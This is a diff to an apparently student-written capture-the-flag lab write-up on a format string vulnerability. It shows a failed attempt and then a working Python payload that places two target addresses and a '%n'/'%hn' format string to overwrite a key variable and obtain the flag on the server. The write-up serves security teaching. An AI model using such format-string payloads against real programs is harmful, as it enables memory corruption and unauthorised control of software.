@@ -172,4 +172,59 @@ fmt  = (s).encode('latin-1')
 content[12:12 + len(fmt)] = fmt
 ```
 
-After a few minor oopsies in the code, we managed to get the flag with this code.
+We managed to get the flag with this but only locally. This hardcodes the buffer index which makes it not work on the server.
+
+Another possible solution came up
+
+<!--
+Spilling values from other addresses
+This new idea is to use an address that ends with 0x19, for example, to make the %n write the value 48879 in the address of the variable key.
+
+0xbe = 190
+0xef00 = 61184
+
+-->
+Solution that did not work.
+```python
+key_addr1 = 0x0804b321
+key_addr2 = 0x0804b319
+
+content[0:4] = (key_addr1).to_bytes(4,byteorder='little')
+content[4:8] = (key_addr2).to_bytes(4,byteorder='little')
+
+s = "%182x%1$n%60995x%2$hn"
+
+fmt  = (s).encode('latin-1')
+content[8:8 + len(fmt)] = fmt
+```
+<!--
+- screenshot of failed attempt
+Stupid forgot 0x1F and used 0x19
+
+
+
+-->
+Working exploit:
+```python
+key_addr1 = 0x0804b321
+key_addr2 = 0x0804b31F
+
+content[0:4] = (key_addr1).to_bytes(4,byteorder='little')
+content[4:8] = (key_addr2).to_bytes(4,byteorder='little')
+
+s = "%182x%1$n%60995x%2$hn"
+
+fmt  = (s).encode('latin-1')
+content[8:8 + len(fmt)] = fmt
+```
+<!--
+- screenshot of key value
+- screenshot of flag placeholder
+
+We don't need to worry about the rest of the values in the key variable (the bytes 0x22, 0x23), because these will be empty
+(comes from key = 0)
+-->
+
+This also works as expected in the server.
+
+![Alt text](screenshots/w7/ctf/flag_server_ch2.png)
